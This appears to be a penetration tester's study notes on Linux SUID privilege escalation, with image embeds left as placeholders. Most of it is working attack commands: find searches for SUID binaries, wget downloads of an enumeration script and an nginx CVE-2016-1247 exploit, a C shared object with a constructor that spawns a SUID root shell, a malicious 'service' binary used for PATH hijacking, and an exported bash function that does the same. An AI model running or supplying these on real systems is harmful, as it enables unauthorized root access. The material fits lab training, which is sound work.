#### Detection

Files with SUID set run with higher privileges.  Can be found with "s"  on permissions.

-rws-rw-r--

Search for files that have SUID set
```bash - target
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
OR
```bash - target
find / -perm -u=s -type f 2>/dev/null
```

![[Pasted image 20220219141658.png]]


![[Pasted image 20220219141727.png]]

#### suid3num.py

https://gtfobins.github.io/#+suid

```bash - kali
wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py
```

![[Python#Server]]

```bash - target
python suid3num.py
```

#### Shared Objection injection
```bash - target
find / -type f -perm -04000 -ls 2>/dev/null
```

![[Pasted image 20220219142402.png]]

![[Pasted image 20221115134928.png]]

```bash - target
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

![[Pasted image 20221115134943.png]]

The idea here is to find where we have write privileges, overwrite one of these files with our malicious code.  In this example, that file is /home/user/.config/libcalc.so


libcalc.c
```c - kali
#include <stdio.h>
#include <stdlib.h>


static void inject() __attribute__((constructor));

void inject () {
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Verify the output path actually exists.  If not, make it.
Example /home/user/.config

```bash - kali
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c
```

Now just run the original bin:

```bash - kali
/usr/local/bin/suid-so
```

![[Pasted image 20221115135412.png]]

#### CVE-2016-1247 Binary Symlinks
![[3._Automated Tools#Linux Exploit Suggester]]

![[Pasted image 20220219151234.png|1000]]

See if the target has unpatched version of nginx:

```bash - target
dpkg -l | grep nginx
```

```bash - kali
wget https://raw.githubusercontent.com/xl7dev/Exploit/master/Nginx/nginxed-root.sh
```

![[Python#Server]]

```bash - kali
./nginxed-root.sh /var/log/nginx/error.log
```

Logs must be rotated before exploit works.

#### Environmental Variables (Example 1)
```bash - target
env
```

```bash - target
find / -type f -perm -04000 -ls 2>/dev/null
```

![[Pasted image 20220219154119.png]]

/usr/local/bin/suid-env

```bash - target
strings /usr/local/bin/suid-env
```

![[Pasted image 20221115135430.png]]

We see at the bottom it is trying to start Apache by using the service binary.  We will create a malicious service binary.

```bash - target
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
```

```bash - target
gcc /tmp/service.c -o /tmp/service
```

```bash - target
export PATH=/tmp:$PATH
```

![[Pasted image 20221115135443.png]]

Notice now, that /tmp is first on the list when it looks for binary's.

```bash - target
/usr/local/bin/suid-env
```

#### Environmental Variables (Example 2)

```bash - target
strings /usr/local/bin/suid-env2
```

![[Pasted image 20221115135456.png]]

This one uses services located in /usr/sbin/service.  

```bash - target
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```

```bash - target
export -f /usr/sbin/service
```

![[Pasted image 20221115135509.png]]
